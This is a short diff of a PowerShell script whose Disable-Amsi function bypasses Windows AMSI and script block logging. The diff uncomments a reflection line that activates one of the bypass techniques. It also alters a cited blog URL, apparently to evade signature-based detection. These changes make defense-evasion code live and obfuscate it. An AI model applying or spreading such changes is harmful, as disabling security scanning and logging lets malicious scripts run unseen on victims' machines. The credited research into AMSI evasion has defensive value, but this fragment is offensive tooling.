@@ -35,7 +35,7 @@ The approaches implemented in this script heavily rely on the previous work of:
 
 - Matt Graeber: https://github.com/mattifestation/PSReflect
 - Matt Graeber: https://twitter.com/mattifestation/status/735261120487772160
-- Avi Gimpel: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
+- Avi Gimpel: https://www.cyberark.com/threat-research-blog/amsi-bypXXXass-redux/
 - Adam Chester: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
 
 .PARAMETER DontDisableBlockLogging
@@ -738,7 +738,7 @@ function Disable-Amsi
                     break
                 }
             }
-            #$foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+            $foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
             Write-Host "[+] Finished applying technique 1"
             return $k0
         }
